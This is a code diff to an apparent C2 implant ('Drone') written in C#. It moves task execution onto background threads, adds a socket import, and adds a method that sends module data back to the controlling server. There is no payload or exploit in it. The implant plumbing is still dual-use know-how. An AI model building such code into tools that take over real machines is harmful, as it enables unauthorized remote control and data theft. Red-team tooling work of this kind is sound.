@@ -1,10 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net.Sockets;
 using System.Reflection;
 using System.Text;
 using System.Threading;
-
+using System.Threading.Tasks;
 using Drone.Handlers;
 using Drone.Models;
 using Drone.Modules;
@@ -77,25 +78,28 @@ namespace Drone
             
             // send task running
             SendTaskRunning(task.TaskGuid);
-            
-            try
+
+            Task.Factory.StartNew(() =>
             {
-                // run the task
-                command?.Callback.Invoke(task, token.Token);
-                
-                // send task complete
-                SendTaskComplete(task.TaskGuid);
-            }
-            catch (Exception e)
-            {
-                // if module throws, send error back
-                SendError(task.TaskGuid, e.Message);
-            }
-            finally
-            {
-                token.Dispose();
-                _taskTokens.Remove(task.TaskGuid);
-            }
+                try
+                {
+                    // run the task
+                    command?.Callback.Invoke(task, token.Token);
+
+                    // send task complete
+                    SendTaskComplete(task.TaskGuid);
+                }
+                catch (Exception e)
+                {
+                    // if module throws, send error back
+                    SendError(task.TaskGuid, e.Message);
+                }
+                finally
+                {
+                    token.Dispose();
+                    _taskTokens.Remove(task.TaskGuid);
+                }
+            }, token.Token);
         }
 
         private void SendTaskRunning(string taskGuid)
@@ -132,7 +136,17 @@ namespace Drone
             SendC2Message(message);
         }
 
-        public void SendC2Message(C2Message message)
+        public void SendDroneData(string taskGuid, string serverModule, byte[] data)
+        {
+            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, data)
+            {
+                ServerModule = serverModule
+            };
+            
+            SendDroneTaskUpdate(update);
+        }
+
+        private void SendC2Message(C2Message message)
         {
             _handler.QueueOutbound(message);
         }
